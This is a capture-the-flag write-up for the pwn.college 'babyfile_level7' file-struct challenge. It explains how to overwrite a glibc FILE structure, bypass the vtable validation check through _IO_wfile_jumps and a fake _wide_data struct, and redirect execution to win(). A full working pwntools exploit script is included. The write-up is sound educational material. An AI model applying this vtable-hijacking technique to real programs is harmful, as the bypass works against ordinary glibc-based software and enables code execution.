---
title: "Babyfile level 7 Writeup"
author: "J4d3n"
event: "Pwn.College File Struct Exploits"
category: "Pwn - Binary Exploitation"
date: "Jul 27, 2027"
read_time: "8 minutes"
---

# Challenge Description

> Objective: We were given a file called `babyfile_level7` and needed to execute function win() to get the flag using basic file struct exploits.

---

# Initial Analysis

- File information
```bash
jaden@root:/challenge $ file ./babyfile_level7

babyfile_level7: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8e06f2987cf11883b4be4f910a11ecc7a25289e2, for GNU/Linux 3.2.0, not stripped
```

- Checksec
```bash
jaden@root:/challenge $ pwn checksec ./babyfile_level7
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

As you can see, this file's PIE is disabled, which give us full potential to achieve every function's address.

---

# Solution Approach

Walk through your step-by-step approach to solving the challenge.

## Step 1 — Reconnaissance

Reverse the binary with IDA Pro, we have
<details>
<summary>main()</summary>

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge allows you to manipulate the memory of an _IO_FILE struct object. By doing this, you can arbitrarily read");
  puts(
    "or write to take control of the process. You may also take control of the virtual function table at the end of the FILE");
  puts("struct. If you do this, then you can directly take control of the process and call some other function.\n");
  printf("[LEAK] The address of puts() within libc is: %p\n\n", &puts);
  challenge((unsigned int)argc, argv, envp);
  puts("### Goodbye!");
  return 0;
}
```
</details>

<details>
<summary>challenge()</summary>

```c
size_t challenge()
{
  create_tmp_file();
  buf = malloc(0x100u);
  printf("[LEAK] The name buffer is located at: %p\n", buf);
  puts("This exploit will involve altering the virtual function table to directly hijack control flow to execute the win");
  puts(
    "function hidden in this executable. This can be done by creating a fake _wide_data struct which will not have a security");
  puts(
    "check on the vtable. This wide data struct may or may not be overlapping with the original FILE struct. Not overlapping");
  puts(
    "these may be easier to understand but may be harder since you will need access to more memory. In addition to hijacking");
  puts("control flow, you can also control the first parameter since the virtual functions are called with FUNC(fp). By");
  puts("controlling contents of the FILE structure, you can control the next function call and its first parameter.\n");
  fp = fopen("/tmp/babyfile.txt", "w");
  print_fp(fp);
  puts("Please enter your name.");
  read(0, buf, 0x100u);
  printf("Hello, %s!\n", (const char *)buf);
  puts("Now reading from stdin directly to the FILE struct.\n");
  read(0, fp, 0x1E0u);
  print_fp(fp);
  return fwrite(buf, 1u, 0x100u, fp);
}
```
</details>

<details>
<summary>win()</summary>

```c
__uid_t win()
{
  int *v0; // rax
  char *v1; // rax
  __uid_t result; // eax
  int *v3; // rax
  char *v4; // rax

  puts("You win! Here is your flag:");
  flag_fd_5698 = open("/flag", 0);
  if ( flag_fd_5698 >= 0 )
  {
    flag_length_5699 = read(flag_fd_5698, &flag_5697, 0x100u);
    if ( flag_length_5699 > 0 )
    {
      write(1, &flag_5697, flag_length_5699);
      return puts("\n");
    }
    else
    {
      v3 = __errno_location();
      v4 = strerror(*v3);
      return printf("\n  ERROR: Failed to read the flag -- %s!\n", v4);
    }
  }
  else
  {
    v0 = __errno_location();
    v1 = strerror(*v0);
    printf("\n  ERROR: Failed to open the flag -- %s!\n", v1);
    result = geteuid();
    if ( result )
    {
      puts("  Your effective user id is not 0!");
      return puts("  You must directly run the suid binary in order to have the correct permissions!");
    }
  }
  return result;
}
```
</details>


- **`main()` function:** It leaks the libc address of `puts()`. This is incredibly useful as it allows us to calculate the base address of `libc` in memory, defeating Address Space Layout Randomization (ASLR).

- **`challenge()` function:** 
    - It leaks the heap address of `buf`. Since the file has NX (No-eXecute) enabled, we can't just put shellcode here and execute it. However, knowing this address is still crucial for placing our fake structures.
    - It reads `0x100` bytes into `buf`.
    - It allows us to read `0x1E0` bytes directly into `fp`. `fp` is a `FILE` struct pointer allocated after opening `/tmp/babyfile.txt`. This is a massive vulnerability, as it allows us to completely overwrite the `FILE` structure!
    - Finally, it executes `fwrite(buf, 1, 0x100, fp)`, which will trigger functions within the `FILE` structure.

- **`win()` function:** This function simply reads and prints the flag. We need to find a way to execute it.


---

## Step 2 — Vulnerability Identification

### `read(0, fp, 0x1E0)`
The most glaring vulnerability is `read(0, fp, 0x1E0)`. This allows us to overwrite the contents of the `FILE` structure pointed to by `fp`. By overwriting this structure, we can manipulate pointers (like the `vtable` pointer) to control the execution flow of the program.

### `fwrite(buf, 1u, 0x100u, fp)`
This function takes our corrupted `fp` as an argument. Under the hood, functions like `fwrite` rely on a table of function pointers called a `vtable` (virtual method table) located inside the `FILE` structure. If we can hijack this `vtable`, `fwrite` will blindly execute our malicious pointers.

---

## Step 3 — Exploitation

Since our goal is to execute the `win()` function, the most direct approach might seem to be overwriting the `FILE` structure's `vtable` pointer to point to our own fake vtable containing the `win()` address. 

However, in glibc version 2.24 and above, there is a security check called `IO_validate_vtable`. This check prevents us from using a completely fake vtable pointer. Instead, we have to use a known, valid vtable inside `libc` to bypass this check. This technique is often referred to as **vtable hijacking via `_IO_wfile_overflow`** (often using `_IO_wfile_jumps`).

### How does `_IO_wfile_overflow` help us?
The function `_IO_wfile_overflow` calls another function `_IO_wdoallocbuf`. Inside this process, it accesses the `_wide_data` pointer from our original `FILE` struct (`fp`) and treats it as a completely new `FILE` struct! 

The beauty of this is that the functions called from this *new* `_wide_data` struct's vtable **do not have the `IO_validate_vtable` security check**. This means we can finally execute our `win()` function!

Let's look at the assembly instructions involved when `_IO_wfile_overflow` executes:

1. **Get the `_wide_data` pointer:**
   It gets the `_wide_data` struct pointer from our original `fp`.
   ```asm
   rax = [fp + 0xa0] ; 0xa0 is the offset of _wide_data in the FILE struct
   ```
2. **Get the vtable of `_wide_data`:**
   It gets the vtable pointer from this new `_wide_data` struct.
   ```asm
   rax = [rax + 0xe0] ; 0xe0 is the offset of the vtable in _wide_data
   ```
3. **Call a function from the new vtable:**
   It executes a function from the vtable.
   ```asm
   call [rax + 0x68] ; 0x68 is the offset of the function being called
   ```

### How to trigger `win()`?
Let's reverse engineer the steps above to figure out what values we need to control:

**Goal:** We want `call [rax + 0x68]` to execute `win()`.
- Let's say `rax` holds the address `p` (this is our fake `_wide_data` vtable).
- We need the value at `p + 0x68` to be the address of `win()`.

| Address `p` (Fake vtable) | ... | `p + 0x68`    |
|:-------------------------:|:---:|---------------|
| Padding / Garbage         | ... | `win()` address|

**Step Back 1:** The instruction `rax = [rax + 0xe0]` sets `rax` to `p`. 
- Let's say the first `rax` (which is the `_wide_data` pointer) holds the address `m`.
- We need the value at `m + 0xe0` to be `p`.

| Address `m` (`_wide_data`)| ... | `m + 0xe0`    |
|:-------------------------:|:---:|---------------|
| Padding / Garbage         | ... | `p` (Fake vtable address) |

**Step Back 2:** The instruction `rax = [fp + 0xa0]` gets `m` from our `FILE` struct.
- We control `fp`, so we just need to set `fp._wide_data = m`.

### How do we get `fwrite` to call `_IO_wfile_overflow`?
When the program calls `fwrite(buf, 1, 0x100, fp)`, it will look up a specific function in `fp`'s vtable to execute:
```asm
call [vtable + 0x38]
```
To bypass the vtable check, we must point `vtable` to a valid vtable inside libc, specifically `_IO_wfile_jumps`. We need to align it so that when `fwrite` adds `0x38`, it lands exactly on the `_IO_wfile_overflow` function.

Therefore, we set our `FILE` struct's vtable to: 
`address of _IO_wfile_overflow - 0x38`.

---

## Step 4 — Flag Extraction

Now we put it all together to craft our exploit. We will build a fake `FILE` struct and place our fake `_wide_data` inside the `buf` that we control.

First, let's configure the main `FILE` struct (`fp`) to pass basic checks and trigger our exploit:
```python
# Pass basic checks for fwrite(buf, 1, 0x100, fp)
fp._IO_buf_base = leak_buffer + 0x10
fp._IO_buf_end = leak_buffer + 0x10 + 0x100

# Set vtable to bypass check and call _IO_wfile_overflow
# (libc.symbols['_IO_wfile_jumps'] + 0x18 happens to be _IO_wfile_overflow)
fp.vtable = libc.symbols['_IO_wfile_jumps'] + 0x18 - 0x38
```

Next, we need to construct our fake structures inside `buf`. We will overlap our fake `_wide_data` struct and our fake vtable to save space and make it easier.

1. We want our fake vtable (`p`) to be at `leak_buffer`.
   - This means `[leak_buffer + 0x68]` must contain `win()`.
   - Our payload in `buf` will look like: `"a" * 0x68 + win_addr`.

2. We need `_wide_data` (`m`) to point to a location where `[m + 0xe0] = p`.
   - Since `p` is `leak_buffer`, we need `[m + 0xe0] = leak_buffer`.
   - The easiest way is to place the value `leak_buffer` at the very start of our `buf` payload, and then set `m` (`_wide_data`) to `leak_buffer - 0xe0`.
   - This way, `[ (leak_buffer - 0xe0) + 0xe0 ]` evaluates to `[leak_buffer]`, which will hold the value `leak_buffer` (our fake vtable pointer `p`).

So our final payload for `buf` is:
`p64(leak_buffer)` + `"a" * 0x60` + `p64(win_addr)`

*(Note: `0x60` is used because the first `p64` takes up 8 bytes, so `8 + 0x60 = 0x68`, exactly where `win_addr` needs to be!)*

And we set up our `fp` pointers:
```python
fp._wide_data = leak_buffer - 0xe0

# PS: Set _lock to a writable address which contains null bytes by taking advantage of our buf space.
fp._lock = fp._IO_buf_end + 0x10
```

---

# Code / Exploit

Include your solution code here.

### Python Example

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./babyfile_level7.txt_patched")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h',  '-P']

gdbscript = '''
b *challenge+222
b *challenge+336
'''

def conn():
    if args.REMOTE:
        cn = "nc addr 1337"
        cn = cn.split()
        r = remote(cn[1], cn[2])
    elif args.GDB:
        r = gdb.debug([exe.path], gdbscript=gdbscript)
    else:
        r = process([exe.path])

    return r

def main():
    r = conn()

    r.recvuntil(b'[LEAK] The address of puts() within libc is: ')
    leak_puts = int(r.recvline().strip(), 16)
    log.info(f"[LEAK PUTS] {hex(leak_puts)}")

    libc.address = leak_puts - libc.symbols['puts']
    log.info(f"[libc base] {hex(libc.address)}")

    r.recvuntil(b'[LEAK] The name buffer is located at: ')
    leak_buffer = int(r.recvline().strip(), 16)
    log.info(f"[LEAK BUFFER] {hex(leak_buffer)}")

    r.sendafter(b'Please enter your name.', p64(leak_buffer) + b'a' * 0x60 + p64(exe.symbols['win']))

    fp = FileStructure()
    fp._IO_buf_base = leak_buffer + 0x10
    fp._IO_buf_end = leak_buffer + 0x10 + 0x100
    fp._wide_data = leak_buffer - 0xe0
    fp._lock = fp._IO_buf_end + 0x10
    
    log.info(f"libc.address + 0x202208 = {hex(libc.address + 0x202208)}")
    log.info(f"libc.symbols['_IO_wfile_jumps'] + 0x18 = {hex(libc.symbols['_IO_wfile_jumps'] + 0x18 - 0x38)}")
    fp.vtable = libc.symbols['_IO_wfile_jumps'] + 0x18 - 0x38 # libc.symbols['_IO_wfile_jumps'] + 0x18 = symbol _IO_wfile_overflow
    r.sendafter(b'Now reading from stdin directly to the FILE struct.\n', bytes(fp))

    r.interactive()


if __name__ == "__main__":
    main()

```

---


---

# Resources

Links to helpful resources used in solving this challenge.

- [EN - Play with FILE Structure - Yet Another Binary Exploit Technique - An-Jie Yang.](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/EN%20-%20Play%20with%20FILE%20Structure%20-%20Yet%20Another%20Binary%20Exploit%20Technique%20-%20An-Jie%20Yang.pdf)
- [Pwn.College](https://pwn.college/software-exploitation/file-struct-exploits/)